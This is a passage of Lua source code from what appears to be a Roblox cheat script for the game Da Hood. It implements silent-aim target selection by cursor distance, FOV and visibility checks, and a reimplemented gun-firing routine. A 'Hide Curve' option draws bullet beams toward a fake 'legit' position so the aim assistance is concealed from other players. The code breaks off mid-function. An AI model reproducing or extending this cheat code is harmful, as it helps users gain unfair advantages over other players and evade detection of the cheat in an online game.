                textLabel.Position = UDim2.fromOffset(textObj.Position.X + ox, textObj.Position.Y + o.Y)
            end)
            uiStroke.Thickness = 1; uiStroke.Enabled = textObj.Outline; uiStroke.Color = textObj.Color
            textLabel.Parent, uiStroke.Parent = UtilityUI, textLabel
            return setmetatable(table.create(0), {
                __newindex = function(_, index, value)
                    if typeof(textObj[index]) == 'nil' then return end
                    if index == 'Text' then textLabel.Text = value
                    elseif index == 'Font' then value = Clamp(value, 0, 3)
                    elseif index == 'Size' then textLabel.TextSize = value
                    elseif index == 'Position' then
                        local o = textLabel.TextBounds / 2; local ox = textObj.Center and 0 or o.X
                        textLabel.Position = UDim2.fromOffset(textObj.Position.X + ox, textObj.Position.Y + o.Y)
                    elseif index == 'Center' then
                        local p = value and (game:FindFirstChild("Workspace").CurrentCamera.ViewportSize / 2) or textObj.Position
                        textLabel.Position = UDim2.fromOffset(p.X, p.Y)
                    elseif index == 'Outline' then uiStroke.Enabled = value
                    elseif index == 'OutlineColor' then uiStroke.Color = value
                    elseif index == 'Visible' then textLabel.Visible = value
                    elseif index == 'ZIndex' then textLabel.ZIndex = value
                    elseif index == 'Transparency' then
                        local t = ClampTransparency(value); textLabel.TextTransparency = t; uiStroke.Transparency = t
                    elseif index == 'Color' then textLabel.TextColor3 = value end
                    textObj[index] = value
                end,
                __index = function(self, index)
                    if index == 'Remove' or index == 'Destroy' then
                        return function() textLabel:Destroy(); textObj.Remove(self); return textObj:Remove() end
                    elseif index == 'TextBounds' then return textLabel.TextBounds end
                    return textObj[index]
                end,
                __tostring = function() return 'CustomLib' end
            })
        end
    end
end

do
    SetRegion("Game")
    function Script:RayCast(Part, Origin, Ignore, Distance)
        Ignore = Ignore or {}; Distance = Distance or 2000
        local Direction = (Part.Position - Origin).Unit * Distance
        local Cast = Ray.new(Origin, Direction)
        local Hit = Workspace:FindPartOnRayWithIgnoreList(Cast, Ignore)
        return Hit and Hit:IsDescendantOf(Part.Parent), Hit
    end
    function Script:ValidateClient(Player)
        local Object = Player.Character
        local Humanoid = (Object and Object:FindFirstChild("Humanoid")) or false
        local RootPart = (Humanoid and Humanoid.RootPart) or false
        return Object, Humanoid, RootPart
    end
    function Script:GetOrigin(Origin)
        local Object, Humanoid, RootPart = Script:ValidateClient(Self)
        if Origin == 'Head' then
            local Head = Object:FindFirstChild('Head')
            if Head and Head:IsA('RootPart') then return Head.CFrame.Position end
        elseif Origin == 'Torso' and RootPart then return RootPart.CFrame.Position end
        return Workspace.CurrentCamera.CFrame.Position
    end
    function Script:CalculateAngle(v1, v2)
        local d = v1:Dot(v2); local m1 = v1.Magnitude; local m2 = v2.Magnitude
        return math.acos(d / (m1 * m2)) * (180 / math.pi)
    end
    function Script:GetClosestPlayerToCursor(Max, FOV, Feature)
        -- Core-style closest: FOV gate is always taken from Silent Aim config when Feature is Silent Aim
        local ok, result = pcall(function()
            local CurrentCamera = workspace.CurrentCamera
            if not CurrentCamera then return nil end
            local MousePosition = UserInputService:GetMouseLocation()
            local Closest
            local bestScreen = math.huge
            local maxWorld = (type(Max) == 'number' and Max > 0) and Max or math.huge
            local Checks = (getgenv()['Platinun']['General']['Conditions'][Feature]
                or getgenv()['Platinun']['General']['Conditions']['Silent Aimbot']
                or {})

            local saFov = getgenv()['Platinun']['Silent Aimbot'] and getgenv()['Platinun']['Silent Aimbot']['FOV']
            local useCircle, useRect = false, false
            local circleR, halfX, halfY = 120, 127, 127
                        if Feature == 'Silent Aim' and saFov and saFov['Enabled'] then
                if saFov['Mode'] == 'Circle' then
                    useCircle = true
                    circleR = saFov['Circle'] or CurrentFOV or 120
                elseif saFov['Mode'] == '2D' then
                    -- shared.core: 2D is a shot gate (mouse-in-box), not a
                    -- candidate filter. Selection is closest-on-screen.
                    useRect = false
                end
                -- 3D mode: no screen FOV filter here; ShouldShoot raycasts the part
            else
                -- non-silent features: optional circular screen FOV from arg
                local maxScreen = (type(FOV) == 'number' and FOV > 0) and FOV or math.huge
                if maxScreen < math.huge then
                    useCircle = true
                    circleR = maxScreen
                end
            end

            local selfChar = Self.Character
            local selfRoot = selfChar and selfChar:FindFirstChild('HumanoidRootPart')
            if Checks['Self Knocked'] and selfChar and CurrentGame and CurrentGame.Functions and CurrentGame.Functions.IsKnocked then
                local okK, kn = pcall(CurrentGame.Functions.IsKnocked, selfChar)
                if okK and kn then return nil end
            end

            for _, Player in ipairs(Players:GetPlayers()) do
                if Player == Self then continue end
                local Character = Player.Character
                if not Character then continue end
                local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
                if not HumanoidRootPart then continue end
                local hum = Character:FindFirstChildOfClass("Humanoid")
                if not hum or hum.Health <= 0 then continue end

                if selfRoot then
                    if (HumanoidRootPart.Position - selfRoot.Position).Magnitude > maxWorld then continue end
                end

                local Position, OnScreen = CurrentCamera:WorldToViewportPoint(HumanoidRootPart.Position)
                if not OnScreen then continue end

                if Checks['Visible'] then
                    local okRay, visible = pcall(function()
                        return Script:RayCast(HumanoidRootPart, Script:GetOrigin('Camera'), {selfChar, SilentAimPart, TriggerPart})
                    end)
                    if not okRay or not visible then continue end
                end

                if Checks['Knocked'] and CurrentGame and CurrentGame.Functions and CurrentGame.Functions.IsKnocked then
                    local okK, kn = pcall(CurrentGame.Functions.IsKnocked, Character)
                    if okK and kn then continue end
                end

                if Checks['Carried'] and CurrentGame and CurrentGame.Functions and CurrentGame.Functions.IsGrabbed then
                    local okG, gr = pcall(CurrentGame.Functions.IsGrabbed, Player)
                    if okG and gr then continue end
                end

                local dx = Position.X - MousePosition.X
                local dy = Position.Y - MousePosition.Y
                local Magnitude = math.sqrt(dx * dx + dy * dy)

                if useCircle then
                    if Magnitude > circleR then continue end
                elseif useRect then
                    if math.abs(dx) > halfX or math.abs(dy) > halfY then continue end
                end

                if Magnitude < bestScreen then
                    Closest = Player
                    bestScreen = Magnitude
                end
            end
            return Closest
        end)
        if ok then return result end
        return nil
    end
end

do
    SetRegion("Gun System")
    function Modules.DaHood()
        if string.find(GameName, "Da Hood") then
            local IsClient = RunService:IsClient()
            local PlaceIDCheck = game.PlaceId == 88976059384565
            local function CanShoot(Character)
                if Character then
                    local Humanoid = Character:FindFirstChild("Humanoid")
                    if Humanoid and (Humanoid.Health > 0 and Humanoid:GetState() ~= Enum.HumanoidStateType.Dead) then
                        local BodyEffects = Character:FindFirstChild("BodyEffects")
                        if BodyEffects then
                            local Tool = Character:FindFirstChildWhichIsA("Tool")
                            if Tool and (Tool:FindFirstChild("Handle") and Tool:FindFirstChild("Ammo")) then
                                if not PlaceIDCheck and IsClient then
                                    if BodyEffects:FindFirstChild("Block") then
                                        shared.playerShot(Tool.Handle); Tool.Handle.NoAmmo:Play(); return
                                    end
                                    if Tool.Ammo.Value == 0 then Tool.Handle.NoAmmo:Play(); return end
                                end
                                if Character:FindFirstChild("FULLY_LOADED_CHAR") == nil then return
                                elseif Character:FindFirstChild("FORCEFIELD") then return
                                elseif Character:FindFirstChild("GRABBING_CONSTRAINT") then return
                                elseif Character:FindFirstChild("Christmas_Sock") then return
                                elseif BodyEffects.Cuff.Value == true then return
                                elseif BodyEffects.Attacking.Value == true then return
                                elseif BodyEffects["K.O"].Value == true then return
                                elseif BodyEffects.Grabbed.Value then return
                                elseif BodyEffects.Reload.Value == true then return
                                elseif BodyEffects.Dead.Value == true then return
                                elseif not Tool:GetAttribute("Cooldown") then
                                    local LastShot = Character:GetAttribute("LastGunShot")
                                    Character:SetAttribute("LastGunShot", Tool.Name)
                                    if not IsClient or (LastShot == Tool.Name or not Character:GetAttribute("ShotgunDebounce")) then
                                        if not IsClient and (not Character:GetAttribute("ShotgunDebounce") and (Tool.Name == "[Shotgun]" or (Tool.Name == "[Double-Barrel SG]" or (Tool.Name == "TacticalShotgun" or Tool.Name == "Drum-Shotgun")))) then
                                            Character:SetAttribute("ShotgunDebounce", true)
                                            task.delay(0.65, function() Character:SetAttribute("ShotgunDebounce", nil) end)
                                        end
                                        return true
                                    end
                                end
                            else return end
                        else return end
                    else return end
                else return end
            end
            local function ColorTransform(p14, p15)
                if p15 == 0 then return p14.Keypoints[1].Value end
                if p15 == 1 then return p14.Keypoints[#p14.Keypoints].Value end
                for v16 = 1, #p14.Keypoints - 1 do
                    local v17 = p14.Keypoints[v16]; local v18 = p14.Keypoints[v16 + 1]
                    if v17.Time <= p15 and p15 < v18.Time then
                        local v19 = (p15 - v17.Time) / (v18.Time - v17.Time)
                        return Color3.new((v18.Value.R - v17.Value.R) * v19 + v17.Value.R, (v18.Value.G - v17.Value.G) * v19 + v17.Value.G, (v18.Value.B - v17.Value.B) * v19 + v17.Value.B)
                    end
                end
            end
            local replicatedStorage = game:GetService("ReplicatedStorage")
            local playersService = game:GetService("Players")
            local localPlayer = playersService.LocalPlayer
            local playerCharacter = Self.Character or Self.CharacterAdded:Wait()
            local shootAnimation = playerCharacter.Humanoid.Animator:LoadAnimation(replicatedStorage:WaitForChild("Animations"):WaitForChild("GunCombat"):WaitForChild("Shoot"))
            local aimShootAnimation = playerCharacter.Humanoid.Animator:LoadAnimation(replicatedStorage:WaitForChild("Animations"):WaitForChild("GunCombat"):WaitForChild("AimShoot"))
            local v_u_14 = { MouseButton2 = {} }
            local function changefunc()
                local v_u_38 = { ["functions"] = {} }
                function v_u_38.connect(_, p36) local v37 = v_u_38.functions; table.insert(v37, p36) end
                local v_u_39 = nil
                function v_u_38.updatechanges(_, p_u_40)
                    for _, v_u_41 in pairs(v_u_38.functions) do spawn(function() v_u_41(p_u_40.Press, p_u_40.Time, v_u_39) end) end
                    v_u_39 = p_u_40.Time
                end
                return v_u_38
            end
            setmetatable(v_u_14, {
                ["__index"] = function(_, p42)
                    if getmetatable(v_u_14)[p42] == nil then v_u_14[p42] = {} end
                    return getmetatable(v_u_14)[p42]
                end,
                ["__newindex"] = function(_, p45, p46)
                    if getmetatable(v_u_14)[p45] == nil then
                        getmetatable(v_u_14)[p45] = { ["val"] = p46, ["changed"] = changefunc() }
                    else
                        getmetatable(v_u_14)[p45].val = p46
                        getmetatable(v_u_14)[p45].changed:updatechanges(p46)
                    end
                end
            })
            UserInputService.InputBegan:connect(function(p51, p52)
                if not p52 or (p51.UserInputType == Enum.UserInputType.Keyboard and p51.KeyCode == Enum.KeyCode.LeftShift) or (p51.UserInputType == Enum.UserInputType.Gamepad1 and p51.KeyCode == Enum.KeyCode.ButtonL2) then
                    if p51.UserInputType == Enum.UserInputType.Keyboard or p51.UserInputType == Enum.UserInputType.Gamepad1 then
                        v_u_14[p51.KeyCode.Name] = { ["Press"] = true, ["Time"] = tick() }; return
                    end
                end
                if p51.UserInputType == Enum.UserInputType.MouseButton2 then
                    v_u_14[Enum.UserInputType.MouseButton2.Name] = { ["Press"] = true, ["Time"] = tick() }
                end
            end)
            UserInputService.InputEnded:connect(function(p53, p54)
                if not p54 or (p53.UserInputType == Enum.UserInputType.Keyboard and p53.KeyCode == Enum.KeyCode.LeftShift) or (p53.UserInputType == Enum.UserInputType.Gamepad1 and p53.KeyCode == Enum.KeyCode.ButtonL2) then
                    if p53.UserInputType == Enum.UserInputType.Keyboard or p53.UserInputType == Enum.UserInputType.Gamepad1 then
                        v_u_14[p53.KeyCode.Name] = { ["Press"] = false, ["Time"] = tick() }; return
                    end
                end
                if p53.UserInputType == Enum.UserInputType.MouseButton2 then
                    v_u_14[Enum.UserInputType.MouseButton2.Name] = { ["Press"] = false, ["Time"] = tick() }
                end
            end)
            local v_u_70 = true
            if not v_u_14.MouseButton2 then v_u_14.MouseButton2 = {} end
            if not v_u_14.MouseButton2.changed then v_u_14.MouseButton2.changed = changefunc() end
            v_u_14.MouseButton2.changed:connect(function(p71, _, _)
                if v_u_70 ~= false then
                    Script.Locals.IsAimed = p71
                    if Script.Locals.IsAimed == false then v_u_70 = false; wait(0.1); v_u_70 = true end
                end
            end)
            local weaponNames = { "[Shotgun]", "[Drum-Shotgun]", "[Rifle]", "[TacticalShotgun]", "[AR]", "[AUG]", "[AK47]", "[LMG]", "[SilencerAR]" }
            local v_u_14 = {}
            local function changefunc()
                local v_u_38 = { ["functions"] = {} }
                function v_u_38.connect(_, p36) local v37 = v_u_38.functions; table.insert(v37, p36) end
                local v_u_39 = nil
                function v_u_38.updatechanges(_, p_u_40)
                    for _, v_u_41 in pairs(v_u_38.functions) do spawn(function() v_u_41(p_u_40.Press, p_u_40.Time, v_u_39) end) end
                    v_u_39 = p_u_40.Time
                end
                return v_u_38
            end
            setmetatable(v_u_14, {
                ["__index"] = function(_, p42)
                    if getmetatable(v_u_14)[p42] == nil then v_u_14[p42] = {} end
                    return getmetatable(v_u_14)[p42]
                end,
                ["__newindex"] = function(_, p45, p46)
                    if getmetatable(v_u_14)[p45] == nil then
                        getmetatable(v_u_14)[p45] = { ["val"] = p46, ["changed"] = changefunc() }
                    else
                        getmetatable(v_u_14)[p45].val = p46
                        getmetatable(v_u_14)[p45].changed:updatechanges(p46)
                    end
                end
            })
            UserInputService.InputBegan:connect(function(p51, p52)
                if not p52 or p51.UserInputType == Enum.UserInputType.Keyboard and p51.KeyCode == Enum.KeyCode.LeftShift or p51.UserInputType == Enum.UserInputType.Gamepad1 and p51.KeyCode == Enum.KeyCode.ButtonL2 then
                    if p51.UserInputType == Enum.UserInputType.Keyboard or p51.UserInputType == Enum.UserInputType.Gamepad1 then
                        v_u_14[p51.KeyCode.Name] = { ["Press"] = true, ["Time"] = tick() }; return
                    end
                    if p51.UserInputType == Enum.UserInputType.MouseButton2 then
                        v_u_14[Enum.UserInputType.MouseButton2.Name] = { ["Press"] = true, ["Time"] = tick() }
                    end
                end
            end)
            UserInputService.InputEnded:connect(function(p53, p54)
                if not p54 or p53.UserInputType == Enum.UserInputType.Keyboard and p53.KeyCode == Enum.KeyCode.LeftShift or p53.UserInputType == Enum.UserInputType.Gamepad1 and p53.KeyCode == Enum.KeyCode.ButtonL2 then
                    if p53.UserInputType == Enum.UserInputType.Keyboard or p53.UserInputType == Enum.UserInputType.Gamepad1 then
                        v_u_14[p53.KeyCode.Name] = { ["Press"] = false, ["Time"] = tick() }; return
                    end
                    if p53.UserInputType == Enum.UserInputType.MouseButton2 then
                        v_u_14[Enum.UserInputType.MouseButton2.Name] = { ["Press"] = false, ["Time"] = tick() }
                    end
                end
            end)
            local v_u_70 = true
            v_u_14.MouseButton2.changed:connect(function(p71, _, _)
                if v_u_70 ~= false then
                    Script.Locals.IsAimed = p71
                    if Script.Locals.IsAimed == false then v_u_70 = false; wait(0.1); v_u_70 = true end
                end
            end)
            local function Animate(target)
                playerCharacter = localPlayer.Character or localPlayer.CharacterAdded:Wait()
                if playerCharacter and playerCharacter:FindFirstChild("Humanoid") and playerCharacter.Humanoid:FindFirstChild("Animator") then
                    shootAnimation = playerCharacter.Humanoid.Animator:LoadAnimation(replicatedStorage.Animations.GunCombat.Shoot)
                    aimShootAnimation = playerCharacter.Humanoid.Animator:LoadAnimation(replicatedStorage.Animations.GunCombat.AimShoot)
                    if Script.Locals.IsAimed or table.find(weaponNames, target.Parent.Name) then
                        aimShootAnimation:Play()
                    else
                        shootAnimation:Play()
                    end
                end
            end
            shared.playerShot = Animate
            local v3 = game:GetService("Players"); local v_u_5 = game:GetService("TweenService")
            local v_u_7 = v3.LocalPlayer; local v_u_9 = ReplicatedStorage.SkinAssets
            local v_u_13 = game:FindFirstChild("Workspace"):GetServerTimeNow()
            local _ = game.PlaceId == 88976059384565
            local SoundsPlaying = {}
            local function GetAim(Position)
                if _G.MobileShiftLock then return (Camera.CFrame.p + Camera.CFrame.LookVector * 60 - Position).unit end
                local v24
                if Mouse.Target then v24 = Mouse.Hit.p
                else
                    local v25 = Camera.CFrame
                    local v26 = v25.p + v25.LookVector * 60
                    local v27 = v25.LookVector
                    local v28 = Camera:ScreenPointToRay(Mouse.X, Mouse.Y)
                    local v29 = v28.Direction; local v30 = v28.Origin
                    v24 = v30 + v29 * ((v26 - v30):Dot(v27) / v29:Dot(v27))
                end
                return (v24 - Position).Unit, (v24 - Position).Magnitude
            end
            local function ShootGun(p34)
                local v35 = p34.Shooter; local v_u_36 = p34.Handle; local v37 = p34.AimPosition
                local v38 = p34.BeamColor; local v39 = p34.isReflecting; local v40 = p34.Hit
                local v41 = p34.Range or 200; local LegitPosition = p34.LegitPosition
                local v_u_42 = v_u_36 and v_u_36:GetAttribute("SkinName") or v_u_36
                local _, v43 = GetAim(v_u_36.Position)
                local v_u_44 = p34.ForcedOrigin or v_u_36.Muzzle.WorldPosition
                local v45 = (v37 - v_u_44).Unit
                local v46 = RaycastParams.new(); local v47 = {}
                local function set_list(targetTable, index, values)
                    for i, v in ipairs(values) do targetTable[index + i - 1] = v end
                end
                local v48 = { game:FindFirstChild("Workspace"):WaitForChild("Bush"), game:FindFirstChild("Workspace"):WaitForChild("Ignored"), SilentAimPart, TriggerPart }
                set_list(v47, 1, {v35, unpack(v48)})
                v46.FilterDescendantsInstances = v47; v46.FilterType = Enum.RaycastFilterType.Exclude; v46.IgnoreWater = true
                local v_u_49, v_u_50, v_u_51
                if v40 then v_u_49 = p34.Hit; v_u_50 = p34.AimPosition; v_u_51 = p34.Normal
                else
                    local v52 = game:FindFirstChild("Workspace"):Raycast(v_u_44, v45 * v41, v46)
                    if v52 then v_u_49 = v52.Instance; v_u_50 = v52.Position; v_u_51 = v52.Normal
                    else v_u_50 = v_u_44 + v45 * math.min(v43, v41); v_u_51 = nil; v_u_49 = nil end
                end
                local v_u_53 = Instance.new("Part")
                v_u_53:SetAttribute("OwnerCharacter", v35.Name)
                v_u_53.Name = "BULLET_RAYS"; v_u_53.Anchored = true; v_u_53.CanCollide = false
                v_u_53.Size = Vector3.new(0, 0, 0); v_u_53.Transparency = 1
                game.Debris:AddItem(v_u_53, 1)
                if getgenv()['Platinun']['Silent Aimbot']['Hide Curve'] then
                    v_u_53.CFrame = CFrame.new(v_u_44, LegitPosition)
                else
                    v_u_53.CFrame = CFrame.new(v_u_44, v_u_50)
                end
                v_u_53.Material = Enum.Material.SmoothPlastic
                v_u_53.Parent = game:FindFirstChild("Workspace").Ignored.Siren.Radius
                local v54 = Instance.new("Attachment"); v54.Position = Vector3.new(0, 0, 0); v54.Parent = v_u_53
                local v55 = Instance.new("Attachment"); local v56 = -(v_u_50 - v_u_44).magnitude
                v55.Position = Vector3.new(0, 0, v56); v55.Parent = v_u_53
                local v_u_57 = false; local v_u_58 = nil; local v59
                if v_u_36 then
                    local v60 = v_u_36.Parent.Name
                    if v_u_42 and v_u_42 ~= "" then
                        if v_u_9.GunSkinMuzzleParticle:FindFirstChild(v_u_42) then
                            if not v39 then
                                if v_u_9.GunSkinMuzzleParticle[v_u_42]:FindFirstChild("Muzzle") then
                                    if v_u_36.Parent:FindFirstChild("Default") and (v_u_36.Parent.Default:FindFirstChild("Mesh") and v_u_36.Parent.Default.Mesh:FindFirstChild("Muzzle")) then
                                        local v61
                                        if v_u_9.GunSkinMuzzleParticle[v_u_42].Muzzle:FindFirstChild("Different_GunMuzzle") then
                                            v61 = v_u_9.GunSkinMuzzleParticle[v_u_42].Muzzle.Different_GunMuzzle[v60]
                                        else v61 = v_u_9.GunSkinMuzzleParticle[v_u_42].Muzzle end
                                        for _, v62 in pairs(v61:GetChildren()) do
                                            local v63 = v62:GetAttribute("EmitCount") or 1
                                            local v_u_64 = v62:Clone()
                                            v_u_64.Parent = v_u_36.Parent.Default.Mesh.Muzzle
                                            v_u_64:Emit(v63)
                                            task.delay(v_u_64.Lifetime.Max, function() v_u_64:Destroy() end)
                                        end
                                    end
                                else
                                    local v65 = v_u_9.GunSkinMuzzleParticle[v_u_42]:GetChildren()
                                    local v66 = v65[math.random(#v65)]:Clone()
                                    v66.Parent = v54; v66:Emit(v66.Rate)
                                end
                            end
                            v_u_57 = true
                        end
                        if v_u_9.GunBeam:FindFirstChild(v_u_42) then
                            if v_u_9.GunBeam[v_u_42].GunBeam:IsA("BasePart") then
                                v59 = { ["Parent"] = nil, ["Attachment0"] = nil, ["Attachment1"] = nil }
                                if v_u_9.GunBeam[v_u_42].GunBeam:FindFirstChild("Different_GunBeam") then
                                    if v_u_9.GunBeam[v_u_42].GunBeam.Different_GunBeam[v60].GunBeam:IsA("BasePart") then
                                        v_u_58 = v_u_9.GunBeam[v_u_42].GunBeam.Different_GunBeam[v60].GunBeam:Clone()
                                    else v59 = v_u_9.GunBeam[v_u_42].GunBeam.Different_GunBeam[v60].GunBeam:Clone() end
                                else v_u_58 = v_u_9.GunBeam[v_u_42].GunBeam:Clone() end
                            else v59 = v_u_9.GunBeam[v_u_42].GunBeam:Clone() end
                        else
                            v59 = game.ReplicatedStorage.GunBeam:Clone()
                            v59.Color = v38 and ColorSequence.new(v38) or v59.Color
                        end
                    else
                        v59 = game.ReplicatedStorage.GunBeam:Clone()
                        v59.Color = v38 and ColorSequence.new(v38) or v59.Color
                    end
                else v59 = nil end
                task.spawn(function()
                    if v_u_58 then
                        local v67 = (v_u_50 - v_u_44).magnitude; local v68 = v67 / 725
                        v_u_58.Anchored = true; v_u_58.CanCollide = false; v_u_58.CanQuery = false
                        v_u_58.CFrame = CFrame.new(v_u_44, v_u_50)
                        local v69 = v_u_58.CFrame * CFrame.new(0, 0, -v67)
                        v_u_58.Parent = game:FindFirstChild("Workspace").Ignored.Siren.Radius
                        task.delay(v68 + 5, function() v_u_58:Destroy(); v_u_58 = nil end)
                        if v_u_58:GetAttribute("SpecialEffects") then
                            for _, v70 in pairs(v_u_58:GetDescendants()) do
                                if v70:IsA("Trail") and v70:GetAttribute("ColorRandom") then
                                    local v71 = v70:GetAttribute("ColorRandom")
                                    v70.Color = ColorSequence.new(ColorTransform(v71, math.random()))
                                end
                            end
                        end
                        local v72 = game:GetService("TweenService"):Create(v_u_58, TweenInfo.new(0.05, Enum.EasingStyle.Linear), { ["CFrame"] = v_u_58.CFrame * CFrame.new(0, 0, -0.1) })
                        v72:Play(); task.wait(0.05)
                        if v72.PlaybackState ~= Enum.PlaybackState.Completed then v72:Pause() end
                        local v73 = nil
                        if _G.Reduce_Lag and not v_u_58:GetAttribute("NoSlow") or v_u_58:GetAttribute("LOWGFX") then
                            v_u_58.CFrame = v69
                        else
                            v73 = game:GetService("TweenService"):Create(v_u_58, TweenInfo.new(v68, Enum.EasingStyle.Linear), { ["CFrame"] = v69 })
                            v73:Play(); task.wait(v68)
                        end
                        if v_u_58:FindFirstChild("Impact") and (v_u_49 and (v_u_51 and not v_u_49.Parent:FindFirstChild("Humanoid"))) then
                            if v73 and v73.PlaybackState ~= Enum.PlaybackState.Completed then task.wait(0.05) end
                            if not v_u_58:FindFirstChild("NoNormal") then v_u_58.CFrame = CFrame.new(v_u_50, v_u_50 - v_u_51) end
                            for _, v74 in pairs(v_u_58.Impact:GetChildren()) do
                                if v74:IsA("ParticleEmitter") then v74:Emit(v74:GetAttribute("EmitCount") or 1) end
                            end
                        else
                            for _, v75 in pairs(v_u_58:GetChildren()) do
                                if v75:IsA("BasePart") then v75.Transparency = 1 end
                            end
                        end
                        if v_u_58 then
                            for _, v76 in pairs(v_u_58:GetDescendants()) do
                                if v76:IsA("ParticleEmitter") then v76.Enabled = false end
                            end
                        end
                    elseif v_u_49 and (v_u_49:IsDescendantOf(game:FindFirstChild("Workspace").MAP) and (v_u_42 and (v_u_9.GunBeam:FindFirstChild(v_u_42) and v_u_9.GunBeam[v_u_42]:FindFirstChild("Impact")))) then
                        local v_u_77 = v_u_9.GunBeam[v_u_42].Impact:Clone()
                        v_u_77.Parent = game:FindFirstChild("Workspace").Ignored
                        v_u_77:PivotTo(CFrame.new(v_u_50, v_u_50 + v_u_51 * 5) * CFrame.Angles(-1.5707963267948966, 0, 0))
                        for _, v78 in pairs(v_u_77:GetDescendants()) do
                            if v78:IsA("ParticleEmitter") then v78:Emit(v78:GetAttribute("EmitCount") or 1) end
                        end
                        task.delay(1.5, function() v_u_77:Destroy(); v_u_77 = nil end)
                    end
                    local v79 = Instance.new("PointLight")
                    v79.Brightness = 0.5; v79.Range = 15; v79.Shadows = true; v79.Color = Color3.new(1, 1, 1); v79.Parent = v_u_53
                    local v80 = v_u_36:FindFirstChild("ShootBBGUI")
                    local v81 = v80 and (not v_u_57 and v80:FindFirstChild("Shoot"))
                    if v81 then
                        v81.Size = UDim2.new(0, 0, 0, 0); v81.ImageTransparency = 1; v81.Visible = true
                        v_u_5:Create(v81, TweenInfo.new(0.4, Enum.EasingStyle.Bounce, Enum.EasingDirection.In, 0, false, 0), { ["Size"] = UDim2.new(1, 0, 1, 0), ["ImageTransparency"] = 0.4 }):Play()
                        v_u_5:Create(v79, TweenInfo.new(0.4, Enum.EasingStyle.Bounce, Enum.EasingDirection.In, 0, false, 0), { ["Range"] = 0 }):Play()
                        wait(0.4); v_u_53:Destroy()
                        v_u_5:Create(v81, TweenInfo.new(0.2, Enum.EasingStyle.Bounce, Enum.EasingDirection.In, 0, false, 0), { ["Size"] = UDim2.new(1, 0, 1, 0), ["ImageTransparency"] = 1 }):Play()
                        wait(0.2); v81.Visible = false
                    end
                end)
                v59.Attachment0 = v54; v59.Attachment1 = v55; v59.Name = "NewGunBeam"; v59.Parent = v_u_53
                if v35 == v_u_7.Character and game:FindFirstChild("Workspace"):GetServerTimeNow() - v_u_13 > 0.95 then Animate(v_u_36) end
                local playsound = function(p1, p2)
                    local v3 = p1.ShootSound:GetAttribute("SequenceSFX")
                    if v3 then
                        if p1.ShootSound:GetAttribute("CurrentSequence") == nil then p1.ShootSound:SetAttribute("CurrentSequence", 1)
                        else p1.ShootSound:SetAttribute("CurrentSequence", p1.ShootSound:GetAttribute("CurrentSequence") + 1) end
                        local v4 = p1.ShootSound:GetAttribute("CurrentSequence"); local v5 = {}
                        for v6 in string.gmatch(v3, "%d+") do table.insert(v5, v6) end
                        p1.ShootSound.SoundId = "rbxassetid://" .. v5[v4 % #v5 + 1]
                    end
                    if p2 then
                        local v_u_7 = p1.ShootSound:Clone(); v_u_7.Name = "MG"; v_u_7.Parent = p1; v_u_7:Play()
                        delay(1, function() v_u_7:Destroy() end)
                    else p1.ShootSound:Play() end
                end
                if not SoundsPlaying[v_u_36] then
                    task.spawn(playsound, v_u_36, true)
                    SoundsPlaying[v_u_36] = true
                    task.delay(0.021, function() SoundsPlaying[v_u_36] = nil end)
                end
                if game.Lighting:GetAttribute("printhits") then
                    local v82 = print; local v83 = v_u_49
                    if v83 then v83 = v_u_49:GetFullName() end
                    v82(v83)
                end
                return v_u_50, v_u_49, v_u_51
            end
            return { CanShoot = CanShoot, Animate = Animate, GetAim = GetAim, ColorTransform = ColorTransform, ShootGun = ShootGun }
        else return {} end
    end
end

do
    SetRegion("Main")
    local DaHood = Modules.Get("DaHood")
    function Script:GetClosestPointOnPart(Part, Scale)
        local PartCFrame = Part.CFrame; local PartSize = Part.Size
        local PartSizeTransformed = PartSize * (Scale / 2)
        local MousePosition = UserInputService:GetMouseLocation()
        local CurrentCamera = Workspace.CurrentCamera
        local MouseRay = CurrentCamera:ViewportPointToRay(MousePosition.X, MousePosition.Y)
        local Transformed = PartCFrame:PointToObjectSpace(MouseRay.Origin + (MouseRay.Direction * MouseRay.Direction:Dot(PartCFrame.Position - MouseRay.Origin)))
        if (Mouse.Target == Part) then return Vector3.new(Mouse.Hit.X, Mouse.Hit.Y, Mouse.Hit.Z) end
        return PartCFrame * Vector3.new(
            math.clamp(Transformed.X, -PartSizeTransformed.X, PartSizeTransformed.X),
            math.clamp(Transformed.Y, -PartSizeTransformed.Y, PartSizeTransformed.Y),
            math.clamp(Transformed.Z, -PartSizeTransformed.Z, PartSizeTransformed.Z)
        )
    end
    function Script:GetClosestPointOnPartBasic(Part)
        if Part then
            local MouseRay = Mouse.UnitRay
            MouseRay = MouseRay.Origin + (MouseRay.Direction * (Part.Position - MouseRay.Origin).Magnitude)
            local Point = (MouseRay.Y >= (Part.Position - Part.Size / 2).Y and MouseRay.Y <= (Part.Position + Part.Size / 2).Y) and (Part.Position + Vector3.new(0, -Part.Position.Y + MouseRay.Y, 0)) or Part.Position
            local Check = RaycastParams.new(); Check.FilterType = Enum.RaycastFilterType.Whitelist; Check.FilterDescendantsInstances = {Part}
            local Ray = Workspace:Raycast(MouseRay, (Point - MouseRay), Check)
            if Mouse.Target == Part then return Mouse.Hit.Position end
            if Ray then return Ray.Position else return Mouse.Hit.Position end
        end
    end
    function Script:GetClosestPartToCursor(Character)
        local CurrentCamera = Workspace.CurrentCamera; local Closest; local Distance = 1/0
        for _, Part in ipairs(Character:GetChildren()) do
            if (not Part:IsA("BasePart")) then continue end
            local Position = CurrentCamera:WorldToViewportPoint(Part.Position)
            Position = Vector2.new(Position.X, Position.Y)
            local Magnitude = (UserInputService:GetMouseLocation() - Position).Magnitude
            if (Magnitude < Distance) then Closest = Part; Distance = Magnitude end
        end
        return Closest
    end
    function Script:GetClosestPartToCursorFilter(Character, PartsToCheck)
        local CurrentCamera = Workspace.CurrentCamera; local Closest = nil; local Distance = 1/0
        for _, Part in ipairs(Character:GetChildren()) do
            if not Part:IsA("BasePart") or (PartsToCheck and not table.find(PartsToCheck, Part.Name)) then continue end
            local Position = CurrentCamera:WorldToViewportPoint(Part.Position)
            Position = Vector2.new(Position.X, Position.Y)
            local Magnitude = (UserInputService:GetMouseLocation() - Position).Magnitude
            if Magnitude < Distance then Closest = Part; Distance = Magnitude end
        end
        return Closest
    end
    function Script:GetResolvedVelocity(Part)
        local LastPosition = Part.Position
        task.wait(0.085)
        local CurrentPosition = Part.Position
        local Velocity = (CurrentPosition - LastPosition) / 0.085
        return Velocity
    end
    local smoothedVelocity = Vector3.new(0, 0, 0)
    local function getDynamicSmoothingFactor(velocityMagnitude)
        if velocityMagnitude < 5 then return 0.05
